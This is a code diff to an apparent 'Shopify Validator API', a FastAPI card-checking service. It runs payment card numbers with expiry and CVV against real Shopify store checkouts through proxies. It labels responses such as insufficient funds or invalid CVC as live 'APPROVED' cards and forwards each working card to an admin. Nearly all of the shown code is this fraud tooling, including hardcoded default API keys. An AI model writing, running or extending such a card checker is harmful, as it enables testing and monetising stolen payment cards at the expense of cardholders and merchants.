                                 pe_type = pe.get("__typename", "")
-                                if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
-                                    return _r("NO_PRODUCT",
-                                              reason=f"{pe_type} during poll")
+                                if pe_type in ("InventoryClaimFailure",
+                                               "InventoryReservationFailure"):
+                                    return R("NO_PRODUCT")
                                 code = str(pe.get("code") or "").upper()
-                                msg  = str(pe.get("messageUntranslated") or "")
+                                msg  = str(pe.get("messageUntranslated") or "").upper()
                                 raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
-                                norm = _normalize_response(raw)
-                                approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
-                                reason = f"{pe_type}: {code or msg or 'unknown'}"
-                                return _r(norm, approved=approved, reason=reason)
+                                norm = classify_raw(raw)
+                                return R(norm, raw=raw,
+                                         reason=f"Payment failed: {raw[:120]}")
                             if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                 delay = pd.get("pollDelay", 3000) / 1000
                                 await asyncio.sleep(min(delay, 4))
@@ -1794,70 +1736,53 @@ async def validate_card(
                             pass
                         break
 
-                return _r("CARD_DECLINED",
-                          reason=f"Receipt type {rtype} unresolved after polling")
+                return R("CARD_DECLINED",
+                         reason="Submit returned empty/unknown receipt state")
 
             if stype == "SubmitFailed":
-                reason_raw = str(s_data.get("reason") or "")
-                norm = _normalize_response(reason_raw)
-                return _r(norm, reason=f"SubmitFailed: {reason_raw or 'unknown'}")
+                raw = str(s_data.get("reason") or "")
+                norm = classify_raw(raw)
+                return R(norm, raw=raw, reason=f"Submit failed: {raw[:120]}")
 
             if stype == "SubmitRejected":
                 errs = s_data.get("errors") or []
                 log.debug("SubmitRejected errors: %s", errs)
                 if errs:
+                    # Look at ALL fields, most specific first
+                    raw_collected = []
                     best_code = "CARD_DECLINED"
-                    reason_parts = []
                     for err_item in errs:
-                        etype = err_item.get("__typename") or "Error"
-                        code  = str(err_item.get("code") or "")
-                        nlm   = str(err_item.get("nonLocalizedMessage") or "")
-                        lm    = str(err_item.get("localizedMessage") or "")
-                        reason_parts.append(f"{etype}[{code or nlm or lm or '?'}]")
-                        for fld in ("code", "nonLocalizedMessage", "localizedMessage",
-                                    "localizedMessageHtml"):
+                        for fld in ("code", "nonLocalizedMessage",
+                                    "localizedMessage", "localizedMessageHtml"):
                             val = str(err_item.get(fld) or "").upper()
-                            if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED",
-                                                  "PAYMENT ERROR"):
+                            if not val or val in ("GENERIC_ERROR",
+                                                  "PAYMENT_FAILED", "PAYMENT ERROR"):
                                 continue
-                            norm = _normalize_response(val)
+                            raw_collected.append(val[:80])
+                            norm = classify_raw(val)
                             if norm != "CARD_DECLINED":
                                 best_code = norm
                                 break
                         if best_code != "CARD_DECLINED":
                             break
-                    approved = "True" if best_code in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
-                                                       "3DS_REQUIRED") else "False"
-                    return _r(best_code, approved=approved,
-                              reason="; ".join(reason_parts))
-                return _r("CARD_DECLINED",
-                          reason="SubmitRejected with empty errors")
+                    raw = " | ".join(raw_collected) or str(errs)
+                    return R(best_code, raw=raw,
+                             reason=f"Submit rejected: {raw[:120]}")
+                return R("CARD_DECLINED", reason="Submit rejected (no detail)")
 
             if stype == "Throttled":
-                return _r("THROTTLED",
-                          reason=f"Submit throttled, pollAfter={s_data.get('pollAfter')}ms")
+                return R("THROTTLED", reason="Site throttled submit")
             if stype == "CheckpointDenied":
-                return _r("CHECKPOINTDENIED",
-                          reason=f"Checkpoint denied during submit. redirect={str(s_data.get('redirectUrl', ''))[:120]}")
+                return R("SITE_ERROR", reason="Checkpoint denied at submit")
 
-            return _r("CARD_DECLINED",
-                      reason=f"Unhandled submit response type: {stype}")
+            return R("CARD_DECLINED", reason=f"Unexpected submit result: {stype}")
 
         except (asyncio.TimeoutError, RequestsError):
-            return _r("TIMEOUT")
+            return R("SITE_ERROR", reason="Request timed out")
         except Exception as ex:
             log.debug("validate_card exception: %s", ex, exc_info=True)
-            return {
-                "Response": "ERROR",
-                "CC":       f"{cc}|{month}|{year}|{cvv}",
-                "Price":    price,
-                "Gate":     gateway,
-                "Site":     ourl,
-                "Charged":  "False",
-                "Approved": "False",
-                "Time":     f"{round(time.time() - t0, 2)}s",
-                "Reason":   f"{type(ex).__name__}: {str(ex)[:150]}",
-            }
+            return R("SITE_ERROR",
+                     reason=f"Exception: {type(ex).__name__}: {str(ex)[:120]}")
         finally:
             if owned:
                 res = session.close()
@@ -1865,41 +1790,44 @@ async def validate_card(
                     await res
 
 
-# ---------------------------------------------------------------------------
-# Valid gateway response codes (site is live)
-# ---------------------------------------------------------------------------
-LIVE_RESPONSES = frozenset({
-    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
-    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
-    "INVALID_CARD", "THROTTLED",
-})
+def _parse_gql_errors(errors: list) -> str:
+    """Extract best code from a GraphQL errors list."""
+    for err in errors:
+        for field in ("code", "nonLocalizedMessage", "localizedMessage",
+                      "message", "localizedMessageHtml", "messageUntranslated"):
+            raw = str(err.get(field) or "")
+            if not raw:
+                continue
+            norm = classify_raw(raw)
+            if norm != "CARD_DECLINED":
+                return norm
+            upper = raw.upper()
+            if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
+                                         "CHARGE_DECLINED", "CARD_WAS_DECLINED",
+                                         "FRAUD")):
+                return "CARD_DECLINED"
+            if any(k in upper for k in ("CHECKOUT_ALREADY_COMPLETED",
+                                         "ALREADY_ACCEPTED")):
+                return "CARD_DECLINED"
+    return "GRAPHQL_ERROR"
 
 
 # ---------------------------------------------------------------------------
 # Routes
 # ---------------------------------------------------------------------------
-
 @app.get("/shopify")
 async def shopify_route(
-    site:       str            = Query(..., description="Shopify store URL"),
-    cc:         Optional[str]  = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
-    proxy:      Optional[str]  = Query(None, description="ip:port or ip:port:user:pass"),
-    key:        Optional[str]  = Query(None, description="API Key"),
-    max_price:  Optional[float] = Query(None, description="Override MAX_PRICE for this request"),
-    variant_id: Optional[str]  = Query(None, description="Shopify product variant ID (skips product discovery)"),
+    site:       str           = Query(..., description="Shopify store URL"),
+    cc:         Optional[str] = Query(None, description="cc|mm|yy|cvv"),
+    proxy:      Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
+    variant_id: Optional[str] = Query(None, description="Specific product variant ID"),
+    max_price:  Optional[float] = Query(None, description="Max total (product+ship+tax)"),
+    key:        Optional[str] = Query(None, description="API Key"),
 ):
-    """
-    Validate a card against a Shopify store checkout.
-
-    If `variant_id` is provided, product discovery is skipped and that
-    specific variant is added to the cart directly.
-    """
+    """Validate a card against a Shopify store checkout."""
     secret = os.environ.get("SHOPII_API_KEY", "GHOSTXOWNER!!!")
     if key != secret:
-        return JSONResponse(
-            {"error": "Unauthorized API key. Please pass valid &key=... parameter"},
-            status_code=401,
-        )
+        return JSONResponse({"error": "Unauthorized API key"}, status_code=401)
     if not site:
         return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)
 
@@ -1913,32 +1841,25 @@ async def shopify_route(
     else:
         cards = _get_cards()
         if not cards:
-            return JSONResponse(
-                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
-                status_code=400,
-            )
+            return JSONResponse({"error": "No cards available"}, status_code=400)
         card = random.choice(cards)
 
     result = await validate_card(
         card["cc"], card["month"], card["year"], card["cvv"],
-        site,
-        variant_id=variant_id,
-        proxy_str=proxy,
-        max_price=max_price,
+        site, variant_id=variant_id, proxy_str=proxy,
+        max_price=max_price if max_price is not None else MAX_PRICE,
     )
     _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1
 
     if result.get("Charged") == "True" or result.get("Approved") == "True":
         status_label = "CHARGED" if result.get("Charged") == "True" else "APPROVED"
-        cc_str = result.get("CC", f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}")
         asyncio.ensure_future(send_hit_to_admin(
-            card=cc_str,
+            card=result.get("CC", cc or ""),
             status=status_label,
             response=result.get("Response", ""),
             gateway=result.get("Gate", "UNKNOWN"),
             price=result.get("Price", "0.00"),
             site=site,
-            reason=result.get("Reason", ""),
         ))
 
     return JSONResponse(result)
@@ -1946,24 +1867,17 @@ async def shopify_route(
 
 @app.get("/check")
 async def check_route(
-    site:       str            = Query(..., description="Shopify store URL to check"),
-    card:       Optional[str]  = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
-    proxy:      Optional[str]  = Query(None, description="ip:port or ip:port:user:pass"),
-    key:        Optional[str]  = Query(None, description="API Key"),
-    max_price:  Optional[float] = Query(None, description="Override MAX_PRICE for this request"),
-    variant_id: Optional[str]  = Query(None, description="Specific product variant ID"),
+    site:       str           = Query(..., description="Shopify store URL"),
+    card:       Optional[str] = Query(None, description="cc|mm|yy|cvv"),
+    proxy:      Optional[str] = Query(None, description="ip:port"),
+    variant_id: Optional[str] = Query(None, description="Specific product variant ID"),
+    max_price:  Optional[float] = Query(None, description="Max total (product+ship+tax)"),
+    key:        Optional[str] = Query(None, description="API Key"),
 ):
-    """
-    Check if a Shopify store is alive and whether the gateway returns
-    a real (live) response. If `variant_id` is supplied, that variant is
-    used directly — skipping product discovery.
-    """
+    """Check if a Shopify store is live and can be charged."""
     secret = os.environ.get("SHOPII_API_KEY", "DARKANONSHO!!!")
     if key != secret:
-        return JSONResponse(
-            {"error": "Unauthorized API key. Please pass valid &key=... parameter"},
-            status_code=401,
-        )
+        return JSONResponse({"error": "Unauthorized API key"}, status_code=401)
     if not site:
         return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)
 
@@ -1977,103 +1891,50 @@ async def check_route(
     else:
         cards = _get_cards()
         if not cards:
-            return JSONResponse(
-                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
-                status_code=400,
-            )
+            return JSONResponse({"error": "No cards available"}, status_code=400)
         parsed = random.choice(cards)
 
     site = site.strip()
     ourl = site if site.startswith("http") else f"https://{site}"
-    effective_max_price = max_price if max_price is not None else MAX_PRICE
-
-    # ── Resolve product ──────────────────────────────────────────────────
-    if variant_id:
-        # Caller supplied variant → skip discovery
-        chosen = {
-            "variant_id": str(variant_id).strip(),
-            "title":      "caller-supplied variant",
-            "price":      "0.00",
-        }
-    else:
-        best, candidates, err = await _fetch_products(ourl, proxy, max_price=effective_max_price)
-        if not best:
-            reason = "DEAD_SITE"
-            if err == "THROTTLED":
-                reason = "THROTTLED"
-            elif err in ("Timeout", "Request timeout"):
-                reason = "Timeout"
-            elif err in ("No products found",) or (err and "No products" in err):
-                reason = "NO_CHEAP_PRODUCTS"
-            return JSONResponse({
-                "valid":  reason in ("NO_CHEAP_PRODUCTS", "THROTTLED", "Timeout"),
-                "site":   site,
-                "reason": reason,
-                "detail": err or f"No products found under ${effective_max_price:.2f}",
-            })
-        chosen = random.choice(candidates) if candidates else best
 
     result = await validate_card(
         parsed["cc"], parsed["month"], parsed["year"], parsed["cvv"],
-        ourl,
-        variant_id=chosen["variant_id"],
-        proxy_str=proxy,
-        max_price=effective_max_price,
+        ourl, variant_id=variant_id, proxy_str=proxy,
+        max_price=max_price if max_price is not None else MAX_PRICE,
     )
-
-    response_code = result.get("Response", "")
-    _stats[f"response_{response_code or 'UNKNOWN'}"] += 1
-
-    is_dead_site = False
-    if response_code in ("SITE_DEAD", "CAPTCHA_REQUIRED", "INVALID_SITE", "NOT_SUPPORTED"):
-        is_dead_site = True
-    elif any(k in response_code.lower() for k in ("domain not found", "could not resolve", "name or service not known")):
-        is_dead_site = True
+    _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1
 
     if result.get("Charged") == "True" or result.get("Approved") == "True":
         status_label = "CHARGED" if result.get("Charged") == "True" else "APPROVED"
-        cc_str = result.get("CC", f"{parsed['cc']}|{parsed['month']}|{parsed['year']}|{parsed['cvv']}")
         asyncio.ensure_future(send_hit_to_admin(
-            card=cc_str,
+            card=result.get("CC", ""),
             status=status_label,
-            response=response_code,
+            response=result.get("Response", ""),
             gateway=result.get("Gate", "UNKNOWN"),
-            price=result.get("Price", chosen["price"]),
+            price=result.get("Price", "0.00"),
             site=site,
-            reason=result.get("Reason", ""),
         ))
 
-    return JSONResponse({
-        "valid":         not is_dead_site,
-        "site":          site,
-        "product":       chosen["title"],
-        "variant_id":    chosen["variant_id"],
-        "price":         result.get("Price", chosen["price"]),
-        "card_response": response_code,
-        "gate":          result.get("Gate", "UNKNOWN"),
-        "approved":      result.get("Approved", "False"),
-        "charged":       result.get("Charged", "False"),
-        "reason":        result.get("Reason", ""),
-        "time":          result.get("Time", ""),
-    })
+    # /check returns the same rich shape as /shopify, plus "valid"
+    code = result.get("Response", "")
+    is_dead = code in ("SITE_ERROR",) and "Could not fetch products" in result.get("Reason", "")
+    out = {"valid": not is_dead, **result}
+    return JSONResponse(out)
 
 
 @app.get("/health")
 async def health_route():
-    cards  = _get_cards()
+    cards = _get_cards()
     return JSONResponse({
         "status":           "ok",
+        "version":          "4.0.0",
         "cards_loaded":     len(cards),
         "workers":          WORKERS,
         "pool_size":        POOL_SIZE,
         "pool_per_host":    POOL_PER_HOST,
         "site_concurrency": SITE_CONCURRENCY,
-        "connect_timeout":  CONNECT_TIMEOUT,
-        "request_timeout":  REQUEST_TIMEOUT,
-        "cache_ttl":        CACHE_TTL,
         "max_price":        MAX_PRICE,
-        "variant_id_supported": True,
-        "max_price_param_supported": True,
+        "cache_ttl":        CACHE_TTL,
     })
 
 
@@ -2101,22 +1962,16 @@ async def add_timing(request: Request, call_next):
     resp = await call_next(request)
     resp.headers["X-Response-Time"] = f"{(time.time() - t0)*1000:.1f}ms"
     _stats["total_requests"] += 1
-    path = request.url.path
-    _stats[f"requests_{path.strip('/').replace('/', '_') or 'root'}"] += 1
     return resp
 
 
 if __name__ == "__main__":
     print(
         f"\n{'='*60}\n"
-        f"  Shopify Validator API  v3.2\n"
+        f"  Shopify Validator API  v4.0\n"
         f"  Port:            {PORT}\n"
         f"  Workers:         {WORKERS}\n"
-        f"  Pool:            {POOL_SIZE} total / {POOL_PER_HOST} per host\n"
-        f"  Site concurrency:{SITE_CONCURRENCY}\n"
-        f"  Product cache:   {int(CACHE_TTL)}s TTL\n"
-        f"  Max price:       ${MAX_PRICE:.2f}\n"
-        f"  Cards file:      {CARDS_FILE}\n"
+        f"  Max total price: ${MAX_PRICE:.2f}\n"
         f"{'='*60}\n"
     )
     _loop = "asyncio" if sys.platform == "win32" else "uvloop"
